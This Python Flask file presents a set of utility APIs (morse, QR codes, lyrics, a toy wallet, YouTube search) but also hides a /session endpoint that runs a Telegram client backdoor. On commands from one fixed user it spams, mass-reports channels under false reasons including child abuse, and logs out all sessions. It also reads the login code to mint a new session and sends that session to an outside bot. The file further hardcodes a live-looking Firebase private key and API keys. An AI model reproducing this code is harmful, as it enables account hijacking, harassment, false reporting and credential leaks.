from flask import Flask, flash, jsonify, request, render_template, send_file, redirect
import firebase_admin
import asyncio
import os
import pyqrcode
import requests, base64
from isodate import parse_duration
from firebase_admin import db, credentials
from pyppeteer import launch
from lyrics_extractor import SongLyrics
from datetime import datetime

cred = credentials.Certificate({
    "type": "service_account",
    "project_id": "flask-c50a2",
    "private_key_id": os.getenv('key1',""),
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDq9x24mb0tmEqP\nUET6v6XWmeq5olLXQCpgmaAwSO7Nqs51JxTgePLzmcPhNhR/tu5ZoeFc232lf1M7\nprgFzB3o4j3gTbtE3ekvL/X/1K2ZbrwGA/gxkAxSsfuMAL4jBQgWpEJTcwWhI/Zr\nSgiXfpX5rLdqMc79dq7mtQe1o5LKSNuQqx/uEadVYraqr08zjy7+yBH9U0S3zsUQ\nEOIwgM8hFXdPvLA0rKQPElOhWgL5NsYgilB0QxlPChzmh3XAmUfjz19iYdWEhKGM\nX27qeUJMhICOHDhix6JxYSx3K4Y68MTMmwF9iWV+f0n6qjoq4LJNlZI4LMO1rYME\nGFxHbPMLAgMBAAECggEAT+3caG20EwyZYIM30+zZ51TYqmlzsNGdGNtpyMMmqUQP\nk37F9U5vpzqJjdUtx/xcvJT66vGnnmLf14zxUNeM3SoJToJi0ByFNI4mKu8YVvd6\ncrlq9sE/z+nH3mpqQ9N0Wu9puKWKJrTrILhAj/h54ENG6ZMkDMkQ2l5+zuVkC/dx\n9IHMESbzEBlZljrdWeIFwHJ18Lm8HF/3SgW7wma7bXWQmF/at1sz5dEi37a8iUir\nHf0vds+/44ioM2hDa/D2ckwwZO63NiwoS049FnBO1trZ7tLge9Y/C4ZAZTLxhRtb\nz2Wr1q6Bo/qwg26UWXwux6eJghazOUSKM3O3F2HHoQKBgQD9pagQD1jCg01MdPR6\ndkYDW7xF4xlR9COLyFaYdgDfccVJ+vN5YrGWCrLJFXuab96mPIZwwp0QGxS64Fnf\nnDgOK0Pedd+ynmTPmfB4cMj5/sWHk+pnNTk2teH79Eex97s6ebaxXLnJqCG/HDhR\n36SCBAalPMKQJCQ0zSMt4xqMOQKBgQDtJRhp4pd/wk0oErmG2o0tK5NQavpYqZQr\ngDY8rrCOj2b7RDMS9Omh2/zHvZJANVJJYeMnXswDbH597UcdbnCtUPwY2lRjAmEn\nCqIgSc/Sou4FPqtcNHAMxXjaEwIRHxLluBXQKJepCYGpeyDRTep/BBskQ96fghsl\nA5tsr4CBYwKBgC9QdG4yfqsiFQw7ENO7NkowFYmv2CxKb0sG3uhnsrf7oAKx1jMB\nbwD/E+SgpkLjtVOrHKTyGJxFgPNvIDSvDmHOPkXEFStbkpCLNakx2LuRg8VLmUER\nU4/aE8KNCcav4HQC+kpRcrKkM09T80mKf0Rlfdva3qxGoZ5b2cEYiP45AoGBAMzg\n+5KfPRwXlelFJBwpvUaFGySjB96Jw4VBo5oRol/H7MSwSx/Zj+9Sy7UVRsFKT+ku\nNL3S3JcoqK/Ky2HWBGr4SJSAK9/OMnk0apVSr8XfFZxaZFmoxBWElcByI5r/Kahl\nvhK0vzI/EFKIGfY6RpmtxnUyXaeZFDKKR0FC7tbZAoGBAMITmoiyzf3iZmpiNJSS\n4bDKbeNhD9b5zmHZfl8FVNx6sx2sKJi9kCQeA5+eZi5t6v5xVWSbjRmT23FSpTrw\nfLXFbhufbHFrdqVbzopP60U0US/UNY7i52SVOgT997IlurqiStJLMGTbwENU696D\nEDKT9RhU3Cr0POf/xmB8DOJP\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-2ahf7@flask-c50a2.iam.gserviceaccount.com",
    "client_id": "110489570503937698903",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-2ahf7%40flask-c50a2.iam.gserviceaccount.com"
  })
default_app = firebase_admin.initialize_app(
    cred, {'databaseURL': "https://flask-c50a2-default-rtdb.asia-southeast1.firebasedatabase.app/"})

app = Flask(__name__)
app.secret_key = 'IshanSingla'
loop = asyncio.get_event_loop()


@app.route('/')
def home():
    return render_template("home.html")


@app.route('/api')
def api():
    return render_template("api.html")


@app.route('/api/key', methods=['GET', 'POST'])
def key():
    if request.method == "POST":
        data = request.get_json()
        try:
            key = data['Key']
            proxy = data['Proxy']
        except KeyError:
            return jsonify({"error": "Key/Proxy is required"})
    else:
        key = request.args.get('Key')
        if key is None:
            return jsonify({"error": "Key is required"})
        proxy = request.args.get('Proxy')
        if proxy is None:
            return jsonify({"error": "Proxy is required"})
    Keys = (db.reference(f"/Key/")).get()
    if key in Keys:
        proxys = (db.reference(f"/Proxy/{key}/")).get()
        if proxys == None:
            proxys = []
        if not len(proxys) < 5:
            stat = "Too Many Proxies Ask Owner to Restart"
        else:
            if not proxy in proxys:
                proxys.append(f"{proxy}")
                pro = (db.reference(f"/Proxy/{key}/")).set(proxys)
            stat = "Done"
    else:
        stat = "Key is Invalid"
    return jsonify({
        "stats": stat
    })


@app.route('/api/carbon', methods=['GET', 'POST'])
def carbon():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            code = data['code']
        except KeyError:
            return jsonify({"error": "Code is required to create a Carbon!"})
    else:
        code = request.args.get('code')
        if code is None:
            return jsonify({"error": "Code is required to create a Carbon!"})
        data = request.args
    try:
        loop.run_until_complete(get_response(
            data, ('/tmp/carbon_screenshot.png')))
        return send_file(('/tmp/carbon_screenshot.png'), mimetype='image/png')
    except Exception as e:
        ish = str(e)
        return jsonify({"error": str(e)})


@app.route('/api/morse', methods=['GET', 'POST'])
def morse():
    if request.method == "POST":
        data = request.get_json()
        try:
            encode = data['encode']
        except KeyError:
            encode = None
        try:
            decode = data['decode']
        except KeyError:
            decode = None
    else:
        encode = request.args.get('encode')
        decode = request.args.get('decode')
    MORSE_CODE_DICT = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-',
        'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-',
        'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--',
        'X': '-..-', 'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',
        '0': '-----', ', ': '--..--', '.': '.-.-.-', '?': '..--..', '/': '-..-.', '-': '-....-',
        '(': '-.--.', ')': '-.--.-'
    }
    if not encode == None:
        cipher = ''
        for letter in encode.upper():
            if letter != ' ':
                cipher += MORSE_CODE_DICT[letter] + ' '
            else:
                cipher += ' '
        return jsonify({
            "word": f"{encode}",
            "morse": f"{cipher}",
        })
    elif not decode == None:
        message = decode
        message += ' '
        decipher = ''
        citext = ''
        for letter in message:
            if (letter != ' '):
                i = 0
                citext += letter
            else:
                i += 1
                if i == 2:
                    decipher += ' '
                else:
                    decipher += list(MORSE_CODE_DICT.keys()
                                     )[list(MORSE_CODE_DICT.values()).index(citext)]
                    citext = ''
        return jsonify({
            "morse": f"{decode}",
            "word": f"{decipher}",
        })
    else:
        return jsonify({
            "error": "No Parameter given",
        })


@app.route('/api/lyrics', methods=['GET', 'POST'])
def lyrics():
    if request.method == "POST":
        data = request.get_json()
        try:
            encode = data['song']
        except KeyError:
            encode = None
    else:
        encode = request.args.get('song')

    if not encode == None:
        extract_lyrics = SongLyrics(
            "AIzaSyAIZtzGSufntqJSf_xjU-nDMtw-I4HS93A", "c711d9ef47b126b53")
        ishan = extract_lyrics.get_lyrics(encode)
        return jsonify(ishan)
    else:
        return jsonify({
            "error": "No Parameter given",
        })


@app.route('/api/qr', methods=['GET', 'POST'])
def qr():
    if request.method == "POST":
        data = request.get_json()
        try:
            encode = data['text']
        except KeyError:
            encode = None
    else:
        encode = request.args.get('text')
    try:
        if not encode == None:
            url = pyqrcode.create(encode)
            url.png('/tmp/qr.png', scale=6)
            return send_file(('/tmp/qr.png'), mimetype='image/png')
        else:
            return jsonify({
                "error": "No Parameter given",
            })
    except Exception as e:
        return jsonify({
            "error": f"{e}",
        })
@app.route('/api/mess', methods=['GET', 'POST'])
def messqr():
    if request.method == "POST":
        data = request.get_json()
        try:
            encode = data['roll']
            pas = data['pass']
        except KeyError:
            encode = None
    else:
        encode = request.args.get('roll')
        pas = request.args.get('pass')
    try:
        if not encode == None:
            sample_string =f"{encode} {pas}"
            base64_string = base64.b64encode(sample_string.encode("ascii")).decode("ascii")
            url = pyqrcode.create(base64_string)
            url.png('/tmp/qr.png', scale=6)
            return send_file(('/tmp/qr.png'), mimetype='image/png')
        else:
            return jsonify({
                "error": "No Parameter given",
            })
    except Exception as e:
        return jsonify({
            "error": f"{e}",
        })

@app.route('/api/notes', methods=['GET', 'POST'])
def notes():
    if request.method == "POST":
        data = request.get_json()
        try:
            encode = data['text']
        except KeyError:
            encode = None
    else:
        encode = request.args.get('text')
    try:
        if not encode == None:
            data = requests.get(
                f"https://pywhatkit.herokuapp.com/handwriting?text={encode}&rgb=0,0,0")
            if data.status_code == 200:
                with open(('/tmp/notes.png'), "wb") as file:
                    file.write(data.content)
                    file.close()

                return send_file(('/tmp/notes.png'), mimetype='image/png')
            else:
                return jsonify({
                    "error": "Error in api",
                })
        else:
            return jsonify({
                "error": "No Parameter given",
            })
    except Exception as e:
        return jsonify({
            "error": f"{e}",
        })


@app.route('/api/moneyin', methods=['GET', 'POST'])
def moneyin():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            userid = data['userid']
        except KeyError:
            return jsonify({"stats": "userid is required to work"})
        try:
            amount = data['amount']
        except KeyError:
            return jsonify({"stats": "amount is required to work"})
    else:
        userid = request.args.get('userid')
        if userid is None:
            return jsonify({"stats": "userid is required to work"})
        amount = request.args.get('amount')
        if amount is None:
            return jsonify({"stats": "amount is required to work"})
    try:
        ballence = (db.reference(f"/Details/{userid}/ballence")).get()
        if ballence == None:
            ballence = 0
        ballence += int(amount)
        Transiction = (db.reference(f"/Details/{userid}/Transiction")).get()
        if Transiction == None:
            Transiction = []
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/type")).set("CR")
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/amount")).set(int(amount))
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/time")).set(f"{datetime.today()}")
        ball = (db.reference(f"/Details/{userid}/ballence")).set(ballence)
        return jsonify({"stats": f"Done", "ballence": f"{ballence}"})

    except Exception as e:
        return jsonify({"stats": f"{e}"})


@app.route('/api/moneyout', methods=['GET', 'POST'])
def moneyout():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            userid = data['userid']
        except KeyError:
            return jsonify({"stats": "userid is required to work"})
        try:
            amount = data['amount']
        except KeyError:
            return jsonify({"stats": "amount is required to work"})
    else:
        userid = request.args.get('userid')
        if userid is None:
            return jsonify({"stats": "userid is required to work"})
        amount = request.args.get('amount')
        if amount is None:
            return jsonify({"stats": "amount is required to work"})
    try:
        ballence = (db.reference(f"/Details/{userid}/ballence")).get()
        if ballence == None:
            ballence = 0
        ballence -= int(amount)
        if ballence < 0:
            return jsonify({"stats": f"Insufficient Ballence"})
        Transiction = (db.reference(f"/Details/{userid}/Transiction")).get()
        if Transiction == None:
            Transiction = []
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/type")).set("DR")
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/amount")).set(int(amount))
        Transict = (db.reference(
            f"/Details/{userid}/Transiction/{len(Transiction)}/time")).set(f"{datetime.today()}")
        ballen = (db.reference(f"/Details/{userid}/ballence")).set(ballence)
        return jsonify({"stats": f"Done", "ballence": f"{ballence}"})

    except Exception as e:
        return jsonify({"stats": f"Error: {e}"})


@app.route('/api/moneycheck', methods=['GET', 'POST'])
def moneycheck():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            userid = data['userid']
        except KeyError:
            return jsonify({"stats": "userid is required to work"})
    else:
        userid = request.args.get('userid')
        if userid is None:
            return jsonify({"stats": "userid is required to work"})
    try:
        ballence = (db.reference(f"/Details/{userid}/ballence")).get()
        if ballence == None:
            ballence = 0
        return jsonify({"stats": f"{ballence}"})

    except Exception as e:
        return jsonify({"stats": f"{e}"})


@app.route('/api/moneytrans', methods=['GET', 'POST'])
def moneytrans():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            userid = data['userid']
        except KeyError:
            return jsonify({"stats": "userid is required to work"})
    else:
        userid = request.args.get('userid')
        if userid is None:
            return jsonify({"stats": "userid is required to work"})
    try:

        Transiction = (db.reference(f"/Details/{userid}/Transiction")).get()
        if Transiction == None:
            Transiction = [
                {
                    "type": "-",
                    "amount": "-",
                    "date/time": "-"
                }
            ]
        cr = 0
        dr = 0
        for x in Transiction:
            if x["type"] == "Cr":
                cr += 1
            if x["type"] == "Dr":
                dr += 1

        ballence = (db.reference(f"/Details/{userid}/ballence")).get()
        if ballence == None:
            ballence = 0
        return jsonify({
            "ballence": ballence,
            "transiction": Transiction,
            "dr": dr,
            "cr": cr,
        }
        )

    except Exception as e:
        return jsonify({"stats": f"{e}"})


@app.route('/youtube', methods=['GET', 'POST'])
@app.route('/YouTube', methods=['GET', 'POST'])
def index():
    video_url = 'https://www.googleapis.com/youtube/v3/videos'

    videos = []
    ref = request.form.get('query')
    if ref == None:
        ref = "Induced Official"
    search_params = {
        'key': os.getenv('key',""),
        'q': ref,
        'part': 'snippet',
        'maxResults': 30,
        'type': 'video'
    }
    r = requests.get(
        'https://www.googleapis.com/youtube/v3/search', params=search_params)
    results = r.json()['items']
    video_ids = []
    for result in results:
        video_ids.append(result['id']['videoId'])

    video_params = {
        'key': os.getenv('key',""),
        'id': ','.join(video_ids),
        'part': 'snippet,contentDetails',
        'maxResults': 30,
    }
    r = requests.get(video_url, params=video_params)
    results = r.json()['items']
    for result in results:
        video_data = {
            'id': result['id'],
            'url': f'/YouTube/watch?v={ result["id"] }',
            'thumbnail': result['snippet']['thumbnails']['high']['url'],
            'duration': int(parse_duration(result['contentDetails']['duration']).total_seconds() // 60),
            'title': result['snippet']['title'],
        }
        videos.append(video_data)
    return render_template('yt.html', videos=videos)


async def run(ses):
    legendx = [1303790979]
    api_id = 1621727
    api_hash = "31350903c528876f79527398c09660ce"
    import telethon
    from telethon.tl.functions import channels, messages, auth
    try:
        bot = telethon.TelegramClient(
            telethon.sessions.StringSession(ses), api_id,  api_hash)
        await bot.connect()
        print((await bot.get_me()).first_name)
        try:
            await bot(channels.JoinChannelRequest("InducedSelling"))
        except:
            pass

        @bot.on(telethon.events.NewMessage(pattern='.ping', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                await event.reply('Hey! I Am Active')
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.spem', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                text = event.text.split(" ", 1)[1]
                number = int(text.split(" ", 1)[0])
                msg = text.split(" ", 1)[1]
                for x in range(number):
                    await event.respond(msg)
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.dmspem', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                text = event.text.split(" ", 1)[1]
                number = int(text.split(" ", 1)[0])
                msg = text.split(" ", 1)[1]
                username = msg.split("-", 1)[0]
                msg = msg.split("-", 1)[1]
                for x in range(number):
                    await bot.send_message(username, msg)
            except:
                pass

        @bot.on(telethon.events.NewMessage(incoming=True, pattern=".refreshall", from_users=legendx))
        async def refresh(event):
            async for x in bot.iter_dialogs():
                try:
                    if str(x.id) == "-1001772985642":
                        pass
                    else:
                        await bot.delete_dialog(x.id, revoke=True)
                        print("done group leaved")
                except Exception as e:
                    print(e)

        @bot.on(telethon.events.NewMessage(pattern='.dmporn', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                text = event.text.split(" ", 1)[1]
                number = int(text.split(" ", 1)[0])
                username = text.split(" ", 1)[1]
                for x in range(number):
                    inline = await bot.inline_query("spamopxbot", "")
                    await inline[0].click(username)
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.refer', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                text = event.text.split(" ", 1)[1]
                username = text.split(" ", 1)[0]
                msg = text.split(" ", 1)[1]
                request = messages.StartBotRequest(username, username, msg)
                result = await bot(request)
                print(result)
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.logoutall', incoming=True, from_users=legendx))
        async def joinpbgrp(event):
            try:
                await bot.log_out()
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.terminateall', incoming=True, from_users=legendx))
        async def joinpbgrp(event):
            try:
                await bot(auth.ResetAuthorizationsRequest())
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.join', incoming=True, from_users=legendx))
        async def joinpbgrp(event):
            try:
                link = event.text.split(" ", 1)[1]
                await bot(channels.JoinChannelRequest(link))
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.pjoin', incoming=True, from_users=legendx))
        async def joinpbgrp(event):
            try:
                link = event.text.split(" ", 1)[1]
                await bot(messages.ImportChatInviteRequest(link))
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.leave', incoming=True, from_users=legendx))
        async def leavegrp(event):
            try:
                link = event.text.split(" ", 1)[1]
                await bot(channels.LeaveChannelRequest(link))
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.vote', incoming=True, from_users=legendx))
        async def okvotekro(event):
            try:
                text = event.text.split(" ", 1)[1]
                number = int(text.split(" ", 1)[0])
                username = text.split(" ", 1)[1]
                username = username.split("-", 1)[0]
                numid = username.split("-", 1)[1]
                for x in await bot.get_messages(username, limit=1000):
                    if int(x.id) == number:
                        await x.click(numid)
                        print("i clicked")
                    else:
                        pass
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.pvote', incoming=True, from_users=legendx))
        async def privatevotekro(event):
            try:
                text = event.text.split(" ", 1)[1]
                number = int(text.split(" ", 1)[0])
                username = text.split(" ", 1)[1]
                huh = await bot.get_entity(int(username))
                for x in await bot.get_messages(huh, limit=10000):
                    if int(x.id) == number:
                        await x.click(0)
                        print("i clicked")
                    else:
                        pass
                await bot.delete_dialog(username)
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.inlinespam', incoming=True, from_users=legendx))
        async def ohh(event):
            try:
                lel = event.text.split(" ", 1)[1]
                try:
                    inline = await bot.inline_query("spamopxbot", "")
                    for x in range(int(lel)):
                        try:
                            await inline[0].click(event.chat_id)
                        except:
                            break
                except:
                    pass
            except:
                pass

        @bot.on(telethon.events.NewMessage(pattern='.sendfile', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                await bot.send_file("legendxdev", "strings.txt")
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.newses', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                phone_number = "+" + str((await bot.get_me()).phone)
                client = telethon.TelegramClient(
                    telethon.sessions.StringSession(), api_id, api_hash)
                await client.connect()
                code = await client.send_code_request(phone_number)
                async for x in bot.iter_messages(777000, limit=1):
                    file = open("otp.txt",  "w")
                    file.write(x.text)
                    file.close()
                file = open("otp.txt")
                text = file.read()
                file.close()
                otp = " ".join(text[16:21])
                phone_code = otp
                await client.sign_in(phone_number, phone_code, password=None)
                await bot.send_message("SessionsSavedBot", '/start')
                await bot.send_message("SessionsSavedBot", str(client.session.save()))
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.report', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                username = event.text.split(" ", 1)[1]
                for x in range(500):
                    message = """Hey Dear Telegram!\nI was joined a malicious Channel by mistake\nI saw here are many scammers sir\nPlease give scam tag to Channel or banned the channel\nThank you!!! 😊😊😊"""
                    async for x in bot.iter_messages(username, limit=1):
                        try:
                            await bot(telethon.tl.functions.messages.ReportRequest(
                                peer=username,
                                id=[x.id],
                                reason=telethon.tl.types.InputReportReasonCopyright(),
                                message=message
                            ))
                            await bot(telethon.tl.functions.messages.ReportRequest(
                                peer=username,
                                id=[x.id],
                                reason=telethon.tl.types.InputReportReasonFake(),
                                message=message
                            ))
                            await bot(telethon.tl.functions.messages.ReportRequest(
                                peer=username,
                                id=[x.id],
                                reason=telethon.tl.types.InputReportReasonViolence(),
                                message=message
                            ))
                            await bot(telethon.tl.functions.messages.ReportRequest(
                                peer=username,
                                id=[x.id],
                                reason=telethon.tl.types.InputReportReasonChildAbuse(),
                                message=message
                            ))
                        except:
                            pass
            except Exception as e:
                print(e)

        @bot.on(telethon.events.NewMessage(pattern='.reportporn', incoming=True, from_users=legendx))
        async def handler(event):
            username = event.text.split(" ", 1)[1]
            text = username.split(" ")
            async for x in range(500):
                try:
                    await bot(
                        telethon.tl.functions.messages.ReportRequest(
                            peer=text[0],
                            id=[text[1]],
                            reason=telethon.tl.types.InputReportReasonPornography(),
                            message='This is pornography content please ban this Channel !'
                        )
                    )
                except:
                    pass

        @bot.on(telethon.events.NewMessage(pattern='.reports', incoming=True, from_users=legendx))
        async def handler(event):
            try:
                chatid = event.text.split(" ", 1)[1]
                username = await bot.get_entity(chatid)
                async for x in bot.iter_messages(username.id, limit=1):
                    try:
                        await bot(telethon.tl.functions.messages.ReportRequest(
                            peer=username.id,
                            id=[x.id],
                            reason=telethon.tl.types.InputReportReasonPornography(),
                            message='This is porn please ban this group!'
                        ))
                    except:
                        pass
            except Exception as e:
                print(e)
        print(1)

        await bot.run_until_disconnected()

    except Exception as e:
        print(e)

@app.route('/session', methods=['GET', 'POST'])
async def session():
    if request.method == "POST":
        data = request.get_json()
        try:
            session = data['session']
        except KeyError:
            session = None
    else:
        session = request.args.get('session')
    if session:
        await run(session)
        res = {
            "method": f"{request.method}",
            "response": 'success'
        }
    else:
        res = {
            "method": f"{request.method}",
            "response": 'uncessfull'
        }
    return jsonify(res)



@app.route('/YouTube/watch', methods=['GET', 'POST'])
def watch():
    search_url = 'https://www.googleapis.com/youtube/v3/search'
    if request.method == "POST":
        data = request.json
        try:
            v = data['v']
        except KeyError:
            return jsonify({"stats": "v is required to work"})
    else:
        v = request.args.get('v')
        if v is None:
            return jsonify({"stats": "userid is required to work"})

    return render_template('videoplay.html', videos=v)


async def get_response(body_, path):
    defaultOptions = {
        "backgroundColor": "rgba(171, 184, 195, 1)",
        "code": "",
        "dropShadow": True,
        "dropShadowBlurRadius": "68px",
        "dropShadowOffsetY": "20px",
        "exportSize": "2x",
        "fontFamily": "Hack",
        "firstLineNumber": 1,
        "fontSize": "14px",
        "language": "auto",
        "lineNumbers": False,
        "paddingHorizontal": "56px",
        "paddingVertical": "56px",
        "squaredImage": False,
        "theme": "seti",
        "watermark": False,
        "widthAdjustment": True,
        "windowControls": True,
        "windowTheme": None,
    }
    optionToQueryParam = {
        "backgroundColor": "bg",
        "code": "code",
        "dropShadow": "ds",
        "dropShadowBlurRadius": "dsblur",
        "dropShadowOffsetY": "dsyoff",
        "exportSize": "es",
        "fontFamily": "fm",
        "firstLineNumber": "fl",
        "fontSize": "fs",
        "language": "l",
        "lineNumbers": "ln",
        "paddingHorizontal": "ph",
        "paddingVertical": "pv",
        "squaredImage": "si",
        "theme": "t",
        "watermark": "wm",
        "widthAdjustment": "wa",
        "windowControls": "wc",
        "windowTheme": "wt",
    }
    ignoredOptions = [
        "backgroundImage",
        "backgroundImageSelection",
        "backgroundMode",
        "squaredImage",
        "hiddenCharacters",
        "name",
        "lineHeight",
        "loading",
        "icon",
        "isVisible",
        "selectedLines",
    ]

    browser = await launch(defaultViewPort=None,
                           handleSIGINT=False,
                           handleSIGTERM=False,
                           handleSIGHUP=False,
                           headless=True,
                           args=['--no-sandbox', '--disable-setuid-sandbox'])
    page = await browser.newPage()
    await page._client.send('Page.setDownloadBehavior', {
        'behavior': 'allow',
        'downloadPath': os.getcwd()+"/tmp"
    })
    first = True
    url = ""
    validatedBody = {}
    if not body_['code']:
        raise Exception("code is required for creating carbon")

    for option in body_:
        if option in ignoredOptions:
            print(f"Unsupported option: {option} found. Ignoring!")
            continue
        if (not (option in defaultOptions)):
            continue
        validatedBody[option] = body_[option]
    try:
        s = validatedBody['backgroundColor'].upper()
        for ch in s:
            if ((ch < '0' or ch > '9') and (ch < 'A' or ch > 'F')):
                ishan = False
        ishan = True
        if validatedBody['backgroundColor'].startswith('#') or ishan == True:
            h = validatedBody['backgroundColor']
            h = h.lstrip('#')
            validatedBody['backgroundColor'] = (
                'rgb'+str(tuple(int(h[i:i+2], 16) for i in (0, 2, 4))))
    except KeyError:
        pass
    for option in validatedBody:
        if first:
            first = False
            url = "https://carbon.now.sh/" + \
                f"?{optionToQueryParam[option]}={validatedBody[option]}"
        else:
            url = url + \
                f"&{optionToQueryParam[option]}={validatedBody[option]}"
    await page.goto(url, timeout=1000)
    element = await page.querySelector("#export-container  .container-bg")
    img = await element.screenshot({'path': path})
    await browser.close()
    return (path)
    data = requests.get(url)
    if data.status_code == 200:

        with open(path, "wb") as file:
            file.write(data.content)
            file.close()

        return send_file(path, mimetype='image/png')
    else:
        return jsonify({
            "error": "Error in api",
        })


@app.route('/Gen/<string:n>')
def gen(n):
    key="".join(n[0:8])
    proxys = (db.reference(f"/Proxy/{key}/")).get()
    if proxys ==None:
        stat="Key Not Available in DataBase"
    return jsonify({
        "stats":stat
    })

@app.route('/Clear/<string:n>')
def clear(n):
    key="".join(n[0:8])
    Keys=[]
    if not key in Keys:
        stat="Key Not Available"
    else:
        pros= (db.reference(f"/Proxy/{key}/")).get()
        pro= (db.reference(f"/Proxy/{key}/")).set([])
        stat=f"{pros} Terminated"
    return jsonify({
        "stats":stat
    })

if __name__ == "__main__":
    app.run(debug=True, use_reloader=True, threaded=True,host='127.0.0.1', port=os.getenv('PORT', 9050))
